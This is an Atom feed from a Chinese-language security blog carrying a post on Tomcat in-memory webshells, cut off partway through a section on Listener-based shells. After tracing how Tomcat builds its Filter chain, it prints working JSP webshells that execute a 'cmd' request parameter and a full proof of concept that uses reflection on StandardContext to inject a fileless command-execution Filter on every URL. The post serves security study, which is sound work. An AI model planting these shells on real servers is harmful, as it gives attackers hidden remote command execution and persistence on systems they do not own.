<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>妙尽璇机</title>
  
  
  <link href="https://changeyourway.github.io/atom.xml" rel="self"/>
  
  <link href="https://changeyourway.github.io/"/>
  <updated>2024-09-26T07:59:49.966Z</updated>
  <id>https://changeyourway.github.io/</id>
  
  <author>
    <name>妙尽璇机</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>漏洞篇 - Tomcat 内存马</title>
    <link href="https://changeyourway.github.io/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://changeyourway.github.io/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2024-09-26T07:31:11.138Z</published>
    <updated>2024-09-26T07:59:49.966Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Servlet-动态注册机制"><a href="#Servlet-动态注册机制" class="headerlink" title="Servlet 动态注册机制"></a>Servlet 动态注册机制</h2><p>Servlet API 提供了动态注册机制，允许在运行时动态注册 Servlets、Filters 和 Listeners，而不需要通过 <code>web.xml</code> 文件或者注解进行静态配置。这种机制从 Servlet 3.0 开始引入，提供了更灵活的方式来配置 Web 应用组件，特别是对于基于注解和自动配置的现代 Web 应用非常有用。</p><p>在 ServletContext 类中提供了一系列 addServlet、addFilter、addListener 方法来提供动态注册功能。</p><h2 id="内存马初探"><a href="#内存马初探" class="headerlink" title="内存马初探"></a>内存马初探</h2><p>学习内存马需要先掌握 JavaWeb ，尤其是三大组件（Servlet、Filter、Listener）和 jsp 的知识。这部分因为我已经学过了，我就不再写博客来说明了。</p><p>此外建议看完前一篇文章 Tomcat 架构再来哦~</p><p>那么先来展示一个简单的内存马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>用 jsp 写的，获取参数为 cmd 的值并执行，但是无回显。</p><p>接下来改一个有回显的内存马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">    if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.print(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>将执行结果的输出流的每一个字节都打印在 web 页面上，<code>&lt;pre&gt;</code> 标签在 HTML 中表示预格式化文本，即其中的内容会按原样显示，保留空格、换行和其他格式。</p><p>简单测试一下这个有回显的马：</p><img src="/images/image-20240920104950670.png"><p>内存马又称无文件马，但是上面的 jsp 后门跟普通的马差不多嘛，还是有文件的，如何才能展示出它的无文件特性呢？且看接下来介绍的几种内存马。</p><h2 id="Tomcat-Filter-内存马"><a href="#Tomcat-Filter-内存马" class="headerlink" title="Tomcat Filter 内存马"></a>Tomcat Filter 内存马</h2><p>说到 Filter ，就一定会提到 Filter 链，Filter 链的执行逻辑如下：</p><img src="/images/image-20240921104042204.png"><h4 id="源码调试"><a href="#源码调试" class="headerlink" title="源码调试"></a>源码调试</h4><p>环境：</p><ul><li><p>JDK 17</p></li><li><p>Tomcat 8.5.68</p></li></ul><p>那么现在有两个 Filter ：Filter1 和 Filter2 ，除了名字以外都一样，采用注解配置的方式，默认按照过滤器类名(字符串)自然排序，也就是说会先执行 Filter1 ，再执行 Filter2 。</p><p>Filter1 代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package filter;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import javax.servlet.annotation.WebFilter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebFilter(&quot;/demo1&quot;)</span><br><span class="line">public class Filter1 implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Filter1 放行前...&quot;);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(&quot;Filter1 放行后...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Servlet 代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package servlet;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">@WebServlet(&quot;/demo1&quot;)</span><br><span class="line">public class ServletDemo extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;get...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;post...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确保运行时，访问 &#x2F;demo1 能够输出如下结果：</p><img src="/images/image-20240921112535052.png"><h6 id="Filter-链的调用"><a href="#Filter-链的调用" class="headerlink" title="Filter 链的调用"></a>Filter 链的调用</h6><p>在 Filter1 的 doFilter 处下断点，开始调试：</p><img src="/images/image-20240921112759071.png"><p>发现下一步没法跟进了，需要的类在 org.apache.catalina.core 包中：</p><img src="/images/image-20240921112736451.png"><p>需要导入依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;  </span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line">&lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">&lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;  </span><br><span class="line">&lt;version&gt;8.5.68&lt;/version&gt;  </span><br><span class="line">&lt;scope&gt;provided&lt;/scope&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>重新调试，跟进 ApplicationFilterChain#doFilter(ServletRequest, ServletResponse)：</p><img src="/images/image-20240921121214666.png"><p>这里会判断 Globals.IS_SECURITY_ENABLED 安全设置开了没有，开了的话就通过 java.security.AccessController#doPrivileged 方法来调用 internalDoFilter(req,res) ，没开的话就直接调用：</p><img src="/images/image-20240921121402920.png"><p>跟进 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse)：</p><img src="/images/image-20240921124101078.png"><p>在这个 filter 数组中获取要调用的 filter 链，再从中获取 filter ，调用它的 doFilter 方法。比如 Filter1.doFilter 调用到这里就获取 Filter2，调用 Filter2.doFilter 。也可以来看一下这个 filter 数组里面存了些什么：</p><img src="/images/image-20240921124341982.png"><p>下标为 0 存的是 Filter1，下标为 1 存的是 Filter2，下标为 2 存的是 WsFilter ，后面就没有了。也就是说理论上调用顺序是：</p><p>Filter1.doFilter -&gt; Filter2.doFilter -&gt; WsFilter.doFilter </p><p>WsFilter 在 org.apache.tomcat.websocket.server 包中，需要导入依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;8.5.68&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>调试完之后我们来看这个调用栈：</p><img src="/images/image-20240921125706538.png"><p>前面是 tomcat 的一些逻辑，从 Filter1.doFilter 开始，后面就是很规律的调用 ApplicationFilterChain#doFilter(ServletRequest, ServletResponse) 和 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse) 。</p><p>而在调用完 WsFilter.doFilter 之后最后一次进入 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse) ，则会调用 servlet.service 方法：</p><img src="/images/image-20240921130152514.png"><p>也就调用到了 doGet 。这就是整个放行前 Filter 链的调用逻辑。</p><h6 id="Filter-对象的创建"><a href="#Filter-对象的创建" class="headerlink" title="Filter 对象的创建"></a>Filter 对象的创建</h6><p>我们的目的是创建一个 Filter 内存马，那么弄清楚 tomcat 是怎样创建 Filter 的就很有必要了。首先来看调用 Filter1.doFilter 之前的调用栈：</p><img src="/images/image-20240921152156823.png"><p>前面都是与进程线程相关的一些调用，不需要关心那么多，我们直接从 StandardEngineValve#invoke(Request, Response) 开始看，往上是各种 invoke 方法的调用，直到最后一个 invoke 。</p><p>这里提一嘴 Tomcat 的一个架构：Tomcat 的 Container 包含四种子容器：Engine、Host、Context 和 Wrapper ，可以看出这四种子容器是按照顺序生成的。</p><p>看一下最后一个 invoke ，StandardWrapperValve#invoke(Request, Response)：</p><img src="/images/image-20240921152723846.png"><p>这里调用 filterChain.doFilter 方法，filterChain 是一个 ApplicationFilterChain 对象，这里的调用链就初见端倪了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterChain#doFilter -&gt; ApplicationFilterChain#internalDoFilter -&gt; Filter1.doFilter -&gt; 循环前面的步骤调用 Filter.doFilter</span><br></pre></td></tr></table></figure><p>说明在这之前有一个 Filter 数组就已经存好了哪些 Filter 的 doFilter 方法将要被调用。显然是存放在 filterChain 中。</p><p>那么关注一下 filterChain 是怎么来的，依然是在 StandardWrapperValve#invoke(Request, Response) 中：</p><img src="/images/image-20240921153234706.png"><p>通过调用 ApplicationFilterFactory.createFilterChain 方法获取了一个 filterChain ，跟进它：</p><img src="/images/image-20240921153600827.png"><p>必须要有 servlet 才能往下走，否则会返回空。首先是创建一个 ApplicationFilterChain 对象，有可能是直接 new ，也有可能从 request 中获取。</p><p>接着往下，把 servlet 放进 filterChain 中。从 wrapper 中获取其所属的上级容器，即 Context 。在 Tomcat 中，容器是按层次结构组织的，Wrapper 是表示单个 Servlet，而 Context 表示整个 Web 应用。获取到 StandardContext 对象之后，又从其中获取了一个 FilterMap ：</p><img src="/images/image-20240921154449749.png"><p>这个 FilterMaps 很重要，接下来这一步循环遍历 FilterMaps 中的 FilterMap ，根据每个 FilterMap 中的 filterName 属性去 FilterConfigs 中查找对应的 FilterConfig ，最后将 FilterConfig 添加进 filterChain ：</p><img src="/images/image-20240921155027109.png"><p>也就是说对每一个 FilterMap ，都要有一个 FilterConfig 与之对应，这样才能找得到。</p><p>调试一下会发现这个 FilterMaps 中果然是存着过滤器类名：</p><img src="/images/image-20240921155706222.png"><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>如果能修改这个 FilterMaps 和 FilterConfigs 中的值，就能够让服务器执行我们自定义的 Filter 了。如何修改呢？</p><p>FilterMaps 是从 StandardContext 中获取的，StandardContext 中可以为 FilterMaps 添加东西的方法有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addFilterMap(FilterMap filterMap)</span><br><span class="line">addFilterMapBefore(FilterMap filterMap)</span><br></pre></td></tr></table></figure><p>这两个方法的区别在于 addFilterMap 将 filterMap 添加到 FilterMaps 数组的末尾，而 addFilterMapBefore 将 filterMap 添加到 FilterMaps 数组的开头，所以如果想让植入的 Filter 内存马第一个生效，就用 addFilterMapBefore 方法。</p><img src="/images/image-20240922113344542.png"><p>至于上面这两个方法的调用可以在 ApplicationFilterRegistration#addMappingForUrlPatterns 中看到：</p><img src="/images/image-20240922150744839.png"><p>这就告诉我们 filterMap 要怎么创建了。</p><p>FilterConfigs 则是在 StandardContext#filterStart 方法中赋值的，这里是调用的 ApplicationFilterConfig 的构造方法创建 filterConfig ：</p><img src="/images/image-20240922114038724.png"><p>从这里就引出另一个重要的属性 filterDefs ，FilterConfig 是依靠它来初始化的，所以如果想初始化 FilterConfig ，还需要先将 filterDefs 属性设置好。</p><p>filterDefs 在 ApplicationContext#addFilter(String, String, Filter) 中创建，这个方法也是对 ServletContext.addFilter 的一个具体实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">private FilterRegistration.Dynamic addFilter(String filterName,</span><br><span class="line">        String filterClass, Filter filter) throws IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">    if (filterName == null || filterName.equals(&quot;&quot;)) &#123;</span><br><span class="line">        throw new IllegalArgumentException(sm.getString(</span><br><span class="line">                &quot;applicationContext.invalidFilterName&quot;, filterName));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">        //TODO Spec breaking enhancement to ignore this restriction</span><br><span class="line">        throw new IllegalStateException(</span><br><span class="line">                sm.getString(&quot;applicationContext.addFilter.ise&quot;,</span><br><span class="line">                        getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FilterDef filterDef = context.findFilterDef(filterName);</span><br><span class="line"></span><br><span class="line">    // Assume a &#x27;complete&#x27; FilterRegistration is one that has a class and</span><br><span class="line">    // a name</span><br><span class="line">    if (filterDef == null) &#123;</span><br><span class="line">        filterDef = new FilterDef();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if (filterDef.getFilterName() != null &amp;&amp;</span><br><span class="line">                filterDef.getFilterClass() != null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (filter == null) &#123;</span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return new ApplicationFilterRegistration(filterDef, context);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ApplicationContext 有一个成员属性 context ，是一个 StandardContext 对象：</p><img src="/images/image-20240922114756160.png"><p>上面的 ApplicationContext#addFilter(String, String, Filter) 方法就是调用 context.addFilterDef 来为这个 StandardContext 添加 FilterDef ，并且是添加到了 filterDefs 属性中：</p><img src="/images/image-20240922115025761.png"><p>至此 StandardContext 中三个重要的属性及其赋值过程就梳理好了，就是这三个：</p><img src="/images/image-20240922115209655.png"><p>总结一下：</p><ul><li><p><strong>filterConfigs</strong></p><ul><li><p>存储每个 <code>Filter</code> 的配置对象（<code>FilterConfig</code>），在运行时为每个 <code>Filter</code> 提供配置信息。</p></li><li><p>StandardContext#filterStart() 中赋值，filterConfig 是通过 ApplicationFilterConfig 的构造方法创建的。</p></li></ul></li><li><p><strong>filterDefs</strong></p><ul><li><p>存储每个 <code>Filter</code> 的定义（<code>FilterDef</code>），记录了 <code>Filter</code> 的基本信息，包括类名和初始化参数等。在 Tomcat 启动 Web 应用时，它会通过 <code>web.xml</code> 或注解扫描生成 <code>FilterDef</code> 对象（其属性对应 xml 配置文件中的标签），然后将这些定义存储在 <code>filterDefs</code> 中。当需要实例化一个 <code>Filter</code> 时，Tomcat 会根据 <code>filterDefs</code> 中的定义，创建相应的 <code>Filter</code> 实例。</p></li><li><p>ApplicationContext#addFilter(String, String, Filter) 中调用 StandardContext#addFilterDef 赋值。</p></li></ul></li><li><p><strong>filterMaps</strong></p></li><li><p>存储 <code>Filter</code> 与 URL 模式或 <code>Servlet</code> 名称的映射关系（<code>FilterMap</code>），决定哪些请求会被哪些 <code>Filter</code> 处理。</p></li><li><p>ApplicationFilterRegistration#addMappingForUrlPatterns 调用 StandardContext#addFilterMapBefore(FilterMap filterMap) 赋值。</p></li></ul><p>那么我们要做的事就明确了，获取当前 web 应用的 StandardContext ，将 filterConfigs、filterDefs、filterMaps 设置好，采用反射的方式。</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    // 获取 ServletContext</span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line">    // 获取 ApplicationContext</span><br><span class="line">    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appContextField.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    // 获取 StandardContext</span><br><span class="line">    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    standardContextField.setAccessible(true);</span><br><span class="line">    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    // 声明一个自定义 Filter</span><br><span class="line">    public class Shell_Filter implements Filter &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">            HttpServletRequest req = (HttpServletRequest) request;</span><br><span class="line">            if (req.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">                InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">                Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    // 设置 filterDefs</span><br><span class="line">    Shell_Filter filter = new Shell_Filter();</span><br><span class="line">    String name = &quot;CommonFilter&quot;;</span><br><span class="line">    FilterDef filterDef = new FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    // 设置 filterMaps</span><br><span class="line">    FilterMap filterMap = new FilterMap();</span><br><span class="line">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    // 获取 filterConfigs 属性</span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">    Configs.setAccessible(true);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    // 设置 filterConfig 并放入 filterConfigs 中</span><br><span class="line">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>很多赋值的思路都可以在源代码中看得到的，可以去模仿。比如 StandardContext#filterStart() 中给出了 filterConfigs 的赋值方式，完全是可以去模仿着来给 filterConfigs 赋值的。</p><p>一个 web 应用只能有一个 StandardContext ，这里将三个属性设置到 StandardContext 以后，每一次不相同的请求都会重新构建一次 filterChain（多个请求相同的话会复用 filterChain），就会重新调用 ApplicationFilterFactory.createFilterChain 。那么第一次访问完这个 jsp 文件之后，第二次访问任意路由都会调用 ApplicationFilterFactory.createFilterChain ，构建出我们想要的 Filter 链，就成功的将我们自定义的 filter 注入进内存当中了。</p><p>所以<strong>第一次访问只是设置属性，第二次访问才是注入，注入点在重新构建 filterChain 这里</strong>。</p><h2 id="Tomcat-Listener-内存马"><a href="#Tomcat-Listener-内存马" class="headerlink" title="Tomcat Listener 内存马"></a>Tomcat Listener 内存马</h2><p>那么根据前面的思路，我们也是想在服务器中动态注册一个自定义的 Listener ，如何做呢？</p><p>JavaWeb 提供了8个监听器：</p><img src="images/image-20210823230820586.png" alt="image-20210823230820586" style="zoom:80%;" /><p>ServletRequestListener 是最适合用来作为内存马的。访问任意资源时都会触发 ServletRequest 的创建和销毁，在客户端每次发起请求时，容器会（例如 Tomcat）创建 ServletRequest 对象，并在请求完成后销毁它，而 ServletRequest 创建和销毁的动作就会触发 ServletRequestListener 监听器，触发 ServletRequestListener#requestInitialized() 方法。</p><h4 id="源码调试-1"><a href="#源码调试-1" class="headerlink" title="源码调试"></a>源码调试</h4><p>同理我们来看一下 Listener 是如何被创建的，下面是一个简单的自定义 Listener ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package Listener;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletRequestEvent;</span><br><span class="line">import javax.servlet.ServletRequestListener;</span><br><span class="line">import javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line">@WebListener</span><br><span class="line">public class MyServletRequestListener implements ServletRequestListener &#123;</span><br><span class="line">    // 在每次请求创建时调用</span><br><span class="line">    @Override</span><br><span class="line">    public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">        System.out.println(&quot;ServletRequest created&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 在每次请求销毁时调用</span><br><span class="line">    @Override</span><br><span class="line">    public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        